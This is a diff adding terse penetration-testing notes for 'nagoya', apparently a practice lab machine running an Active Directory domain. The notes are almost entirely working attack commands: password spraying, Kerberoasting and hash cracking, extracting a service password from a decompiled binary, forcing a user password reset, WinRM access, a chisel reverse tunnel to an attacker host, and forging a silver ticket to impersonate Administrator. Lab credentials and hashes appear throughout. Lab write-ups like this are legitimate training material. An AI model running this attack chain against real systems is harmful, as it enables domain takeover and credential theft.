@@ -1,0 +1,98 @@
+nagoya
+
+	
+192.168.136.21
+sudo nmap -p- 192.168.136.21 -Pn -vv -sS -A --open
+
+domain name nagoya-industries.com
+
+create user.txt from team member page on website 
+crackmapexec smb 192.168.136.21 -u user.txt -p Summer2023
+crackmapexec smb 192.168.136.21 --shares -u user.txt -p Summer2023 --continue-on-success
+
+nagoya-industries.com\Fiona.Clark:Summer2023
+
+smbclient -U 'nagoya-industries.com/svc_mssql' \\\\192.168.136.21\\SYSVOL
+find ResetPassword.exe but unable to download
+
+impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 192.168.136.21 -debug -outputfile kerberoast.txt
+
+Got 2 hash crack those
+
+svc_mssql:Service1
+
+bloodhound-python -u "svc_mssql" -p 'Service1' -d nagoya-industries.com -c all --zip -ns 192.168.136.21
+
+rpcclient -U nagoya-industries/svc_mssql 192.168.136.21
+setuserinfo christopher.lewis 23 'Password123!'
+unable to change the password
+
+Download ResetPassword.exe file from SysVOL folder
+used strings to read strings but useless
+
+used dnspy and opened resetpassword.exe 
+
+find hash value 
+
+svc_helpdesk
+U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+
+rpcclient -U nagoya-industries/svc_helpdesk 192.168.136.21
+setuserinfo christopher.lewis 23 'Password123!'
+
+Done
+christopher.lewis:Password123!
+
+ evil-winrm -i 192.168.57.21 -u christopher.lewis -p Password123!
+ transfer winp.exe
+ 
+
+chmod +x chisel_1.10.0_linux_amd64
+ ./chisel_1.10.0_linux_amd64 server -p 445 --reverse 
+ 
+on windows machine
+.\chisel.exe client 192.168.45.222:445 R:1433:127.0.0.1:1433
+
+
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+
+Get-ADdomain
+-domain-sid S-1-5-21-1969309164-1513403977-1686805993
+-domain nagoya-industries.com
+
+Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+
+-spn MSSQL/nagoya.nagoya-industries.com
+
+https://codebeautify.org/ntlm-hash-generator
+Service1
+-nthash E3A0168BC21CFB88B95C954A5B18F57C
+
+
+Saving ticket in Administrator.ccache
+export KRB5CCNAME=$PWD/Administrator.ccache
+klist 
+for check it 
+
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]        
+        NAGOYA-INDUSTRIES.COM = {
+                kdc = nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+        
+        
+
+ 192.168.57.21
+
